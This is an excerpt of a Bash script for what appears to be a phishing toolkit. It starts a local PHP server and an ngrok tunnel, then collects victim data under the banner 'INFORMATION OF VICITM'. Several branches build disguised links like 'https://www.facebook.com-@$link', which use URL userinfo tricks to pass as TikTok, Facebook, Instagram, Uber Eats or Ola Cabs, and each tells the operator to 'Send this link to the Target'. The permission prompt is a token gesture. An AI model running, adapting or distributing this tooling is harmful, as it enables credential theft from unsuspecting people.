...
echo ""
echo ""
printf " >>>  NGROK SERVER :  IF YOU WANNA RUN THIS PERFECTLY THAN TURN ON MOBILE DATA & HOTSPOT  !"
sleep 4
echo ""
clear
echo ""
echo ""
echo ""
read -p $' >>>   H A D  Y O U  T A K E N  P E R M I S S I O N   ?  (Y/N) : ' option
echo""
echo""
echo""
...
echo ""
                 ...
                 echo -e $'            ---------------        '   
                 read -p $' >>>    What You Want to Choose    > > > > > ' option
                 echo ""
		 if [ $option = 01 ] || [ $option = 1 ]
                 then 
                           ...
                           echo ""
                           echo -e $'       ---------------------------        '
                           echo -e $'     !   PHP SERVER NOW STARTING   !      '
                           echo -e $'       ---------------------------        '
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'       ---------------------------        '
                           echo -e $'     !  NGROK SERVER NOW STARTING  !      '
                           echo -e $'       ---------------------------        '
                           ...
                           echo ""
                           cat HACKER
                           echo -e "====================== INFORMATION OF VICITM ========================= "
                           echo ""
                           echo "" 
                           read -p $' DO YOU WANT TO MODIFY URL ? (Y/N) : ' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $' ------------------------- > > > > > > '
                           printf " Send this link to the Target :" https://www.tiktok.com-@$link                                    
                           echo -e $' ------------------------- > > > > > > >'
                           else
                           echo -e $' ------------------------- > > > > > > '
                           printf " Send this link to the Target :" https://$link
                           echo -e $' ------------------------- > > > > > > > '
                           fi
	          ...
	          then
	                   cd sites/
                           ...
                           then
                           echo -e $' ------------------------- > > > > > > '
                           printf " Send this link to the Target :" https://www.facebook.com-@$link                                    
                           echo -e $' ------------------------- > > > > > > >'
                           else
                           echo -e $' ------------------------- > > > > > > '
                           printf " Send this link to the Target :" https://$link
	          ...
	          then
                           ...
                           then
                           echo -e $' ------------------------- > > > > > > '
                           printf " Send this link to the Target :" https://www.instagram.com-@$link                                    
                           echo -e $' ------------------------- > > > > > > >'
                           else
                           echo -e $' ------------------------- > > > > > > '
                           printf " Send this link to the Target :" https://$link
	         ...
	         then
                           ...
                           then
                           echo -e $' ------------------------- > > > > > >'
                           printf " Send this link to the Target :" https://www.ubereats.com-@$link                                    
                           echo -e $' ------------------------- > > > > > > >'
                           else
                           echo -e $' ------------------------- > > > > > >'
                           printf " Send this link to the Target :" https://$link
	        ...
	        then 
                           ...
                           then
                           echo -e $' ------------------------- > > > > > >'
                           printf " Send this link to the Target :" https://www.olacabs.com-@$link                                    
                           echo -e $' ------------------------- > > > > > > >'
                           else
                           echo -e $' ------------------------- > > > > > >'
                           printf " Send this link to the Target :" https://$link
